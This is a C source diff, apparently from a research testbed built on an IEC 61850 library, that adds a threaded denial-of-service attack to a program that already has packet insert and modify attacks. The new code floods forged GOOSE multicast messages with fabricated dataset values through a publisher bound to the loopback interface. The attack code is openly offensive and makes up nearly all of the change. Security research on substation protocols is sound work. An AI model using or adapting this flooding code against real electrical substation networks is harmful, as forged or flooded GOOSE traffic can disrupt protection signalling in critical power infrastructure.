@@ -13,6 +13,8 @@
 #include "ied_server_private.h"
 #include "mms_goose.h"
 #include "../src/iec61850/server/mms_mapping/mms_goose.c"
+#include <pthread.h>
+
 
 #define CSVFILENAME "value.csv"
 /* import IEC 61850 device model created from SCL-File */
@@ -26,7 +28,7 @@ int main(int argc, char **argv) {
 	double nextUpdatePayloadTime;
 	int port;
 	char *folder;
-
+	pthread_t tid_1;
 
 	//parameters for insert attack
 	bool enableInsertAttack;
@@ -36,6 +38,7 @@ int main(int argc, char **argv) {
 
 	//parameters for suppress attack
 	bool enableModifyAttack;
+	bool enableDoSAttack;
 	int modifyAttack_stnum=5;
 	int modifyAttack_sqnum=0;
 	int modifyAttack_arrayIndex=0;
@@ -52,6 +55,7 @@ int main(int argc, char **argv) {
 		folder = argv[4];
 		enableInsertAttack = false;
 		enableModifyAttack=true;
+		enableDoSAttack = true;
 		/*
 		 * interface = argv[1];
 		 nextUpdatePayloadTime=atof(argv[2]);
@@ -125,7 +129,20 @@ int main(int argc, char **argv) {
 				launchModifyAttack(iedServer, insertAttack_stnum,insertAttack_sqnum,modifyAttack_arrayIndex,modifyAttack_modifiedValue,results);
 			}
 
-			//Mano: 1.check dos condition.2 create a new thread to send dos.
+			//=============================Mano=============================
+			//launch DoS attack
+			if(enableDoSAttack){
+
+				//printf("This is a DOS attack\n");
+				//launchDoSAttack();
+				pthread_create(&tid_1, NULL, launchDoSAttack, (void *)10); //10 is the number of packets
+			    pthread_join(tid_1, NULL);
+			    printf("Thread ended! DoS attack completed! \n");
+			    enableDoSAttack = false;
+
+			}
+
+			//=============================Mano=============================
 
 			IedServer_lockDataModel(iedServer); //Lock the MMS server data model.Client requests will be postponed until the lock is removed.
 			//Insert generated code here
@@ -291,6 +308,69 @@ void insertPacket() {
 			(LinkedListValueDeleteFunction) MmsValue_delete);
 
 }
+
+//=============================Mano=============================
+void *launchDoSAttack(void *packets) {
+	int num_packets;
+	num_packets = (int)packets;
+	// init varaiables
+	LinkedList DoS_dataSetValues = LinkedList_create();
+	GoosePublisher DoS_publisher;
+
+	insertDoSPacket(num_packets, &DoS_dataSetValues, &DoS_publisher); //1000 is the number of packets that I want to insert
+
+	LinkedList_destroyDeep(DoS_dataSetValues,
+			(LinkedListValueDeleteFunction) MmsValue_delete);
+	GoosePublisher_destroy(DoS_publisher);
+
+	//printf("Breakpoint 1 completed!");
+
+}
+
+void insertDoSPacket(int num_of_packets, LinkedList* dataSetValues, GoosePublisher* publisher) {
+
+	printf("inserting a DoS packet\n");
+	char *interface = "lo";
+	int cnt;
+
+	LinkedList_add(*dataSetValues, MmsValue_newIntegerFromInt32(1234));
+	LinkedList_add(*dataSetValues, MmsValue_newBinaryTime(false));
+	LinkedList_add(*dataSetValues, MmsValue_newIntegerFromInt32(5678));
+
+	CommParameters gooseCommParameters;
+
+	gooseCommParameters.appId = 1000;
+	gooseCommParameters.dstAddress[0] = 0x01;
+	gooseCommParameters.dstAddress[1] = 0x0c;
+	gooseCommParameters.dstAddress[2] = 0xcd;
+	gooseCommParameters.dstAddress[3] = 0x01;
+	gooseCommParameters.dstAddress[4] = 0x00;
+	gooseCommParameters.dstAddress[5] = 0x01;
+	gooseCommParameters.vlanId = 0;
+	gooseCommParameters.vlanPriority = 4;
+
+	/*
+	 * Create a new GOOSE publisher instance. As the second parameter the interface
+	 * name can be provided (e.g. "eth0" on a Linux system). If the second parameter
+	 * is NULL the interface name as defined with CONFIG_ETHERNET_INTERFACE_ID in
+	 * stack_config.h is used.
+	 */
+	*publisher = GoosePublisher_create(&gooseCommParameters,
+			interface);
+
+	GoosePublisher_setGoCbRef(*publisher, "liyuanTest/LLN0$GO$gcbAnalogValues");
+	GoosePublisher_setConfRev(*publisher, 1);
+	GoosePublisher_setDataSetRef(*publisher, "liyuanTest/LLN0$AnalogValues");
+	// Send number of packets
+	while(num_of_packets > 1 ) {
+		if (GoosePublisher_publish(*publisher, *dataSetValues) == -1) {
+				printf("Error sending message!\n");
+			}
+		num_of_packets = num_of_packets-1;
+	  }
+
+}
+//=============================Mano=============================
 
 void launchModifyAttack(IedServer iedserver, int suppressAttack_stnum,
 		int suppressAttack_sqnum, int arrayIndex, char* modifiedValue, char** array){
